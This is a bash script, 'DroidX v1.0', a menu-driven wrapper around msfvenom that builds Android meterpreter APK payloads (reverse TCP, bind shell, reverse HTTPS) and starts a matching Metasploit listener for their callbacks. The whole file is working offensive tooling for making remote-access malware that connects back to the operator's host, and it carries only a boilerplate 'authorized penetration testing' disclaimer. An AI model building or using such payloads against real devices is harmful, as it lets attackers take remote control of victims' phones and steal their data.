#!/bin/bash

RED='\033[1;31m'; GREEN='\033[1;32m'; CYAN='\033[1;36m'; YELLOW='\033[1;33m'; RESET='\033[0m'
LOGFILE="droidx_commands_$(date +%Y%m%d_%H%M%S).txt"

show_help() {
    echo -e "${RED}╔══════════════════════════════════════════════╗${RESET}"
    echo -e "${RED}║           DROIDX v1.0 - HELP                ║${RESET}"
    echo -e "${RED}╚══════════════════════════════════════════════╝${RESET}"
    echo -e "${CYAN}Android Payload Builder (MSFvenom Wrapper)${RESET}"
    echo ""
    echo -e "${YELLOW}Usage:${RESET}"
    echo "  ./droidx.sh                     Interactive menu"
    echo "  ./droidx.sh -h                  Show help"
    echo ""
    echo -e "${YELLOW}Features:${RESET}"
    echo "  - Reverse TCP, Bind Shell, HTTPS payload creation"
    echo "  - Auto-generates APK if msfvenom is installed"
    echo "  - Shows manual msfvenom commands if not installed"
    echo "  - Companion meterpreter listener setup"
    echo "  - Android payload reference list"
    echo ""
    echo -e "${RED}DISCLAIMER: Use at your own risk. Developer(s) assume NO liability.${RESET}"
    echo "For authorized penetration testing and educational purposes only."
}

show_banner() {
    clear 2>/dev/null || echo ""
    echo -e "${RED}╔══════════════════════════════════════════════╗${RESET}"
    echo -e "${RED}║              DROIDX v1.0                    ║${RESET}"
    echo -e "${RED}║        Android Payload Builder               ║${RESET}"
    echo -e "${RED}╚══════════════════════════════════════════════╝${RESET}"
    echo -e "${YELLOW}       Use at your own risk!${RESET}"
    echo ""
}

check_msf() {
    if command -v msfvenom &>/dev/null; then
        echo -e "${GREEN}[✓] msfvenom detected${RESET}"
        return 0
    else
        echo -e "${YELLOW}[!] msfvenom not found. Will show manual commands.${RESET}"
        return 1
    fi
}

create_payload() {
    local ptype="$1" lhost="$2" lport="$3"
    local output="payload_${ptype}_$(date +%s).apk"
    local cmd=""

    case $ptype in
        reverse)
            cmd="msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > ${output}"
            local_payload="android/meterpreter/reverse_tcp"
            ;;
        bind)
            cmd="msfvenom -p android/meterpreter/bind_tcp LPORT=$lport R > ${output}"
            local_payload="android/meterpreter/bind_tcp"
            ;;
        https)
            cmd="msfvenom -p android/meterpreter/reverse_https LHOST=$lhost LPORT=$lport R > ${output}"
            local_payload="android/meterpreter/reverse_https"
            ;;
    esac

    echo -e "${CYAN}[*] Payload command:${RESET}" | tee -a "$LOGFILE"
    echo "$cmd" | tee -a "$LOGFILE"
    echo "" >> "$LOGFILE"

    if command -v msfvenom &>/dev/null; then
        echo -e "${CYAN}[*] Generating APK...${RESET}"
        local output_file
        output_file="payload_${ptype}.apk"
        if msfvenom -p "$local_payload" LHOST="$lhost" LPORT="$lport" -o "$output_file" &>/dev/null; then
            echo -e "${GREEN}[✓] Payload created: ${output_file}${RESET}" | tee -a "$LOGFILE"
        else
            echo -e "${RED}[!] Generation failed. Check LHOST/LPORT.${RESET}" | tee -a "$LOGFILE"
        fi
    else
        echo -e "${YELLOW}[!] Copy and run the command on a system with msfvenom:${RESET}" | tee -a "$LOGFILE"
    fi

    local listener="msfconsole -q -x \"use multi/handler; set PAYLOAD ${local_payload}; set LHOST ${lhost}; set LPORT ${lport}; exploit\""
    echo "" >> "$LOGFILE"
    echo -e "${CYAN}[*] Listener command:${RESET}" | tee -a "$LOGFILE"
    echo "$listener" | tee -a "$LOGFILE"
    echo "" >> "$LOGFILE"

    echo -ne "${CYAN}Start listener now? (y/n): ${RESET}"
    read ans
    if [[ "$ans" =~ ^[Yy]$ ]]; then
        if command -v msfconsole &>/dev/null; then
            echo -e "${GREEN}[*] Starting Metasploit listener...${RESET}"
            msfconsole -q -x "use multi/handler; set PAYLOAD ${local_payload}; set LHOST ${lhost}; set LPORT ${lport}; exploit"
        else
            echo -e "${RED}[!] msfconsole not found. Run the listener command manually.${RESET}"
        fi
    fi
}

list_payloads() {
    echo -e "${CYAN}[*] Common Android Payloads:${RESET}" | tee -a "$LOGFILE"
    echo "----------------------------------------" | tee -a "$LOGFILE"
    echo "1) android/meterpreter/reverse_tcp" | tee -a "$LOGFILE"
    echo "2) android/meterpreter/bind_tcp" | tee -a "$LOGFILE"
    echo "3) android/meterpreter/reverse_https" | tee -a "$LOGFILE"
    echo "4) android/shell/reverse_tcp" | tee -a "$LOGFILE"
    echo "5) android/shell/bind_tcp" | tee -a "$LOGFILE"
    echo "6) android/meterpreter/reverse_http" | tee -a "$LOGFILE"
    echo "" | tee -a "$LOGFILE"
    echo -e "${YELLOW}Tip: Use 'msfvenom -l payloads | grep android' for full list${RESET}" | tee -a "$LOGFILE"
    echo "" >> "$LOGFILE"
}

main_menu() {
    while true; do
        show_banner
        echo -e "${CYAN}Select option:${RESET}"
        echo "  1) Create Reverse TCP Payload"
        echo "  2) Create Bind Shell Payload"
        echo "  3) Create HTTPS Payload"
        echo "  4) List Android Payloads"
        echo "  5) Help"
        echo "  6) Exit"
        echo ""
        echo -ne "${GREEN}┌─[${RESET}${RED}DroidX${RESET}${GREEN}]─[${RESET}${YELLOW}Menu${RESET}${GREEN}]${RESET}"
        echo -ne $'\n└──╼ '
        read opt

        case $opt in
            1|2|3)
                read -p "$(echo -e ${CYAN}LHOST (your IP): ${RESET})" lhost
                read -p "$(echo -e ${CYAN}LPORT: ${RESET})" lport
                case $opt in
                    1) create_payload "reverse" "$lhost" "$lport" ;;
                    2) create_payload "bind" "$lhost" "$lport" ;;
                    3) create_payload "https" "$lhost" "$lport" ;;
                esac
                ;;
            4) list_payloads ;;
            5) show_help ;;
            6) echo -e "${GREEN}[✓] Exiting DroidX${RESET}"; exit 0 ;;
            *) echo -e "${RED}[!] Invalid option${RESET}"; sleep 1; continue ;;
        esac
        [ "$opt" = "1" ] || [ "$opt" = "2" ] || [ "$opt" = "3" ] && echo -e "${YELLOW}[i] Commands saved: ${LOGFILE}${RESET}"
        echo -e "${CYAN}Press Enter to continue...${RESET}"; read
    done
}

main() {
    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then show_help; exit 0; fi
    show_banner
    check_msf
    main_menu
}

main "$@"
